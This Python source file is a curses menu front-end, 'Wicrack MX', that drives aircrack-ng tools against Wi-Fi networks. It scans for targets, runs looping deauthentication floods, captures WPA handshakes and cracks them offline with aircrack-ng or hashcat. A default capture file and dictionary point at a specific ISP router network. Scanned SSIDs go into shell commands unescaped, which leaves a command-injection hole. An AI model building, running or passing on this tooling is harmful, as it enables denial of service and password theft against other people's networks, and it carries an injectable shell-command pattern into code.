from getmac import get_mac_address
from wifi import Cell, Scheme
import netifaces
import curses, os #curses is the interface for capturing key presses on the menu, os launches the files
screen = curses.initscr() #initializes a new window for capturing key presses
curses.noecho() # Disables automatic echoing of key presses (prevents program from input each key twice)
curses.cbreak() # Disables line buffering (runs each key as it is pressed rather than waiting for the return key to pressed)
curses.start_color() # Lets you use colors when highlighting selected menu option
screen.keypad(1) # Capture input from keypad

# Change this to use different colors when highlighting
curses.init_pair(1,curses.COLOR_BLACK, curses.COLOR_WHITE) # Sets up color pair #1, it does black text with white background
h = curses.color_pair(1) #h is the coloring for a highlighted menu option
n = curses.A_NORMAL #n is the coloring for a non highlighted menu option
curses.curs_set(0)

MENU = "menu"
COMMAND = "command"
MAINCOMMAND = "maincommand"
EXITMENU = "exitmenu"
INTSEL = "INTSEL" #select interface
WIFISEL = "WIFISEL" #used to generat wifi target list
WIFIOPT = "WIFIOPT" #select wifi target
CAPSEL = "CAPSEL" #select capture files
DICTSEL = "DICTSEL" #select Dictionary files

wifilist = []
wilist = []
interfaces = netifaces.interfaces()

selected_interface = ""
interface_mode = ""
target = ""
target_BSSID = ""
interface_mac = ""
target_channel = ""
capture_file = "\"cap/AXTEL XTREMO-3E6E_62:02:71:88:3E:6F-01.cap\""
password_list = "dictionary/axtel.txt"
list2 = []

# function to refresh all interfaces availables
def refresh_options_list2():
  global list2
  global interfaces
  interfaces = netifaces.interfaces()
  list2 = []
  for x in interfaces:
    list2.append({ 'title': x, 'type': INTSEL, 'command': x })

refresh_options_list2()

# function to see all networks available
def getObjectives(interface):
  cell = list(Cell.all(interface))
  body = []
  for wifi_network in cell:
    row = {
      "SSID": wifi_network.ssid,
      "ADDRESS": wifi_network.address,
      "MODE": wifi_network.mode,
      "CHANNEL": wifi_network.channel,
      "FREQ": wifi_network.frequency,
      "RATE": wifi_network.bitrates,
      "SIGNAL": wifi_network.signal,
      "QUALITY": wifi_network.quality,
      "DEVICE": interface
    }
    body.append(row)
  return body

#crates an empty menu data
menu_data = {}
#function to set the data of the menu, called everytime data changes
def set_data():
    global menu_data
    global list2
    menu_data = {
      'title': "Wicrack MX", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface + " Interface mode: " + interface_mode + " Target: " + target, 'options': [
        { 'title': "Select network interface", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface, 'options': list2 },
        { 'title': "Put interface in monitor mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng start ' + selected_interface, 'status': 'monitor' },
        { 'title': "Put interface in managed mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng stop ' + selected_interface, 'status': 'managed' },
        { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart', 'status': 'null' },
        { 'title': "Select Wifi target", 'type': WIFISEL, 'subtitle': "Selected target: " + target, 'options': wifilist },
        { 'title': "DOS attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
        ]},
        { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "Capture handshake with airplay", 'type': COMMAND, 'command': 'sudo airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + "\"" + target + "\"" + '_' + target_BSSID + ' ' +  selected_interface + "mon\n" 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
        ]},
        { 'title': "Offline WPA/WPA2 cracking menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "Select capture file", 'type': COMMAND, 'command': ''  },
          {'title': "Select dictionary file file", 'type': COMMAND, 'command': ''  },
          {'title': "Aircrack", 'type': COMMAND, 'command': 'aircrack-ng -w ' + password_list + ' -b ' + target_BSSID + ' ' + capture_file + ' -l ' + target + '.pswd'  },
          {'title': "Hashcat", 'type': COMMAND, 'command': 'hashcat -m 2500 -o ' + password_list + ' ' + capture_file  },
        ]},
		    { 'title': "Evil Twin attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "NO", 'type': EXITMENU, },
        ]},
        { 'title': "WPS attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "NO", 'type': EXITMENU, },
        ]},
        { 'title': "WEP attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "NO", 'type': EXITMENU, },
        ]},
        { 'title': "Enterprise attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
          {'title': "NO", 'type': EXITMENU, },
        ]},
      ]
	  }

set_data()

# This function displays the appropriate menu and returns the option selected
def runmenu(menu, parent):
  global menu_data
  # work out what text to display as the last menu option
  if parent is None:
    set_data()
    menu = menu_data
    #os.system('echo > log menu principal')
    lastoption = "Exit"
  else:
    lastoption = "Return to %s menu" % parent['title']
  optioncount = len(menu['options']) # how many options in this menu

  pos = 0 #pos is the zero-based index of the hightlighted menu option. Every time runmenu is called, position returns to 0, when runmenu ends the position is returned and tells the program what opt$
  oldpos = None # used to prevent the screen being redrawn every time
  x = None #control for while loop, let's you scroll through options until return key is pressed then returns pos to program

  # Loop until return key is pressed
  while x != ord('\n'):
    if pos != oldpos:
      oldpos = pos
      screen.border(0)
      screen.addstr(2,2, menu['title'], curses.A_STANDOUT) # Title for this menu
      screen.addstr(4,2, menu['subtitle'], curses.A_BOLD) #Subtitle for this menu

      # Display all the menu items, showing the 'pos' item highlighted
      for index in range(optioncount):
        textstyle = n
        if pos == index:
          textstyle = h
        screen.addstr(5+index,4, "%d - %s" % (index+1, menu['options'][index]['title']), textstyle)
      # Now display Exit/Return at bottom of menu
      textstyle = n
      if pos == optioncount:
        textstyle = h
      screen.addstr(5+optioncount,4, "%d - %s" % (optioncount+1, lastoption), textstyle)
      screen.refresh()
      # finished updating screen

    x = screen.getch() # Gets user input

    # What is user input?
    if x >= ord('1') and x <= ord(chr(optioncount+1)):
      pos = x - ord('0') - 1 # convert keypress back to a number, then subtract 1 to get index
    elif x == 258: # down arrow
      if pos < optioncount:
        pos += 1
      else: pos = 0
    elif x == 259: # up arrow
      if pos > 0:
        pos += -1
      else: pos = optioncount

  # return index of the selected item
  return pos

# This function calls showmenu and then acts on the selected item
def processmenu(menu, parent = None):
  global selected_interface
  global interface_mode
  global target
  global menu_data
  global wifilist
  global wilist
  global target_BSSID
  global interface_mac
  global target_channel
  global list2
  global interfaces
  wifilist = []
  optioncount = len(menu['options'])
  exitmenu = False
  if parent is None:
    set_data()
    menu = menu_data

  while not exitmenu: #Loop until the user exits the menu
    getin = runmenu(menu, parent)
    if getin == optioncount:
      exitmenu = True

    elif menu['options'][getin]['type'] == COMMAND:
      #menu = menu_data
      curses.def_prog_mode()    # save curent curses environment
      os.system('reset')
      screen.clear() #clears previous screen
      os.system('echo > log ' + (menu['options'][getin]['command']))
      os.system(menu['options'][getin]['command']) # run the command
      screen.clear() #clears previous screen on key press and updates display based on pos
      curses.reset_prog_mode()   # reset to 'current' curses environment
      curses.curs_set(1)         # reset doesn't do this right
      curses.curs_set(0)
      os.system('echo > log ' + str(menu))

    elif menu['options'][getin]['type'] == MAINCOMMAND:
      #menu = menu_data
      curses.def_prog_mode()    # save curent curses environment
      os.system('reset')
      screen.clear() #clears previous screen
      #os.system('echo > log ' + (menu_data['options'][getin]['command']))
      os.system(menu_data['options'][getin]['command']) # run the command
      screen.clear() #clears previous screen on key press and updates display based on pos
      curses.reset_prog_mode()   # reset to 'current' curses environment
      curses.curs_set(1)         # reset doesn't do this right
      curses.curs_set(0)
      #os.system('echo > log ' + str(menu))
      if menu['options'][getin]['status'] == 'monitor' and selected_interface[-3:] != 'mon':
        selected_interface = selected_interface + 'mon'
      elif menu['options'][getin]['status'] == 'managed' and selected_interface[-3:] == 'mon':
        selected_interface = selected_interface[0:-3]
        os.system('sudo ifconfig ' + selected_interface + ' up')

    elif menu['options'][getin]['type'] == MENU:
      refresh_options_list2()
      set_data()
      screen.clear() #clears previous screen on key press and updates display based on pos
      menu = menu_data
      processmenu(menu['options'][getin], menu) # display the submenu
      screen.clear() #clears previous screen on key press and updates display based on pos

    elif menu['options'][getin]['type'] == WIFISEL:
      curses.def_prog_mode()    # save curent curses environment
      os.system('reset')
      screen.clear() #clears previous screen
      wilist = getObjectives(selected_interface)

      os.system('echo > log ' + str(wilist))
      for x in wilist:
        wifilist.append({ 'title': x["SSID"], 'type': WIFIOPT, 'command': x["SSID"], 'BSSID': x["ADDRESS"], 'CHANNEL': x['CHANNEL']})
      screen.clear() #clears previous screen on key press and updates display based on pos
      menu = menu_data
      screen.clear() #clears previous screen on key press and updates display based on pos
      curses.reset_prog_mode()   # reset to 'current' curses environment
      curses.curs_set(1)         # reset doesn't do this right
      curses.curs_set(0)

      processmenu(menu['options'][getin], menu) # display the submenu
      screen.clear() #clears previous screen on key press and updates display based on pos

    elif menu['options'][getin]['type'] == WIFIOPT:
      target = menu['options'][getin]['command']
      target_BSSID = menu['options'][getin]['BSSID']
      target_channel= str(menu['options'][getin]['CHANNEL'])
      set_data()
      exitmenu = True #returns to main menu
      screen.clear()
      screen.refresh()
    
    elif menu['options'][getin]['type'] == INTSEL:
      #displayMessage({"title": 'My New Message', "description": "Hello World"})
      is_monitor = selected_interface[-3:]
      if is_monitor == 'mon':
        os.system('sudo airmon-ng stop ' + selected_interface)
        selected_interface = selected_interface.replace('mon', '')
        os.system('sudo ifconfig ' + selected_interface + ' up')
      selected_interface = menu['options'][getin]['command']
      is_monitor = selected_interface[-3:]
      if is_monitor == 'mon':
        os.system('sudo airmon-ng stop ' + selected_interface)
        selected_interface = selected_interface.replace('mon', '')
        os.system('sudo ifconfig ' + selected_interface + ' up')
      interface_mac = str(get_mac_address(interface= selected_interface ))
      set_data()
      exitmenu = True #returns to main menu
      screen.clear()
      screen.refresh()
      # os.system('echo > log ' + str(get_mac_address(interface= selected_interface )))

    elif menu['options'][getin]['type'] == EXITMENU:
      exitmenu = True

# Display Message Function  
def displayMessage(errorType):
  screen.clear()
  screen.border(0)
  screen.addstr(2, 2, errorType['title'], curses.A_STANDOUT)
  screen.addstr(4, 2, errorType['description'], curses.A_BOLD)
  screen.addstr(5, 2, 'Press Enter to continue...', curses.A_BOLD)
  screen.refresh()
  screen.getch()
  screen.clear()

# Main program
processmenu(menu_data)
curses.endwin() #VITAL! This closes out the menu system and returns you to the bash prompt.
os.system('clear')